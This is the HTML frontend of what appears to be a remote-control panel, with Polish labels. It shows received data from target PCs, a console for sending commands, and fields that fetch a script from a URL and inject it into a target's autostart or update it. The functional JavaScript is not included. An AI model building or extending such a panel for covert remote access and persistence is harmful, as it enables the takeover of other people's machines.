<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="./app.js" defer></script>
    <script src="./console.js" defer></script>
    <script src="./popup.js" defer></script>
    <script src="UpdateV.js" defer></script>
    <script></script>

    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="remoteStyle.css">

    <title>PZS PCs IP</title>
</head>
<body>
    <div class="Panic_Button" onclick="PanicButton()"></div>
    <main>
        <h1>Odebrane dane:</h1>
        <div id="data-container"></div>
    </main>

    <div id="popup" class="widziszMnie">
        <div class="console_top">
            <div class="update" ></div>
            <button class="exit" onclick="popupClose(`#popup`)">X</button>
        </div>
        
        <div id="main">

            <div id="update_popup" class="widziszMnie">
                <span>
                    <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="update_name">
                    <input placeholder="URL to Raw Script" type="text" name="fileurl" id="update_url">
                    <input placeholder="Version (X.X)" type="text" name="filever" id="update_ver">
                </span>
                
                <button onclick="UpdateTarget()">Update</button>
                <button onclick="popupClose(`#update_popup`)">Fuck Go Back</button>
            </div>
            
            <div id="console">
                <img src="./assets/XD.gif" alt="XD">
            </div>
    
            <span>
                <input type="text" id="input" placeholder="Wprowadź komendę">
                <button onclick="sendCommand()">Wykonaj</button>
            </span>
    
            <span>
                <span class="script">
                    <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="filename">
                    <input placeholder="URL to Raw Script" type="text" name="fileurl" id="fileurl">
                    <button onclick="InjectScript()" id="injectButton">Inject Script To Autostart</button>
                </span>
                <span id="client_info"></span>
            </span>
            
        </div>
    </div>
    
</body>
</html>
